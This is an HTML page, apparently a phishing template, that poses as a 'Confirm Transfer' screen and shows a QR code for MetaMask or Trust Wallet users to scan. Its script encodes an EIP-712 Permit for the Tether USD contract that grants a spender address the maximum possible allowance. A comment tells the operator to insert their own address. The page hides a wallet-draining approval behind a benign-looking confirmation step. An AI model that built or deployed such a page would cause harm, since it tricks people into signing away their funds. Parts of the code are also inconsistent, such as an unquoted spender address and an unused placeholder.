<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Transfer</title>
    <!-- Load QRCode.js from CDN -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f6f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        h2 {
            color: #333;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            margin-bottom: 20px;
        }
        #qrcode {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
        #qrcode img {
            border: 1px solid #ddd;
            padding: 10px;
            border-radius: 8px;
        }
        .status {
            font-size: 14px;
            color: #28a745;
            font-weight: bold;
        }
        .btn {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 15px;
        }
        .btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Confirm Transfer</h2>
    <p>Scan with MetaMask or Trust Wallet to approve spending.</p>
    
    <div id="qrcode"></div>
    
    <div class="status">Waiting for confirmation...</div>
    <button class="btn" disabled>Processing</button>
</div>

<script>
    // 1. CONFIGURATION
    const YOUR_SPENDER_ADDRESS = "YOUR_WALLET_ADDRESS_HERE"; // REPLACE THIS WITH YOUR ACTUAL ETH ADDRESS
    const AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Max uint256
    
    // 2. THE EIP-712 PAYLOAD
    const payload = {
        domain: {
            name: "Tether USD",
            version: "1",
            chainId: 1,
            verifyingContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
        },
        types: {
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" }
            ]
        },
        primaryType: "Permit",
        message: {
            owner: "0x0000000000000000000000000000000000000000",
            spender: 0xc5Ad65DB7B1e948a88931f268cDf0B544Fa8382b,
            value: AMOUNT,
            nonce: 0,
            deadline: 9999999999
        }
    };

    // 3. GENERATE QR CODE
    document.addEventListener("DOMContentLoaded", function() {
        // Convert JSON to string for the QR code
        const qrData = JSON.stringify(payload);
        
        new QRCode(document.getElementById("qrcode"), {
            text: qrData,
            width: 256,
            height: 256,
            colorDark : "#000000",
            colorLight : "#ffffff",
            correctLevel : QRCode.CorrectLevel.H
        });
    });
</script>

</body>
</html>
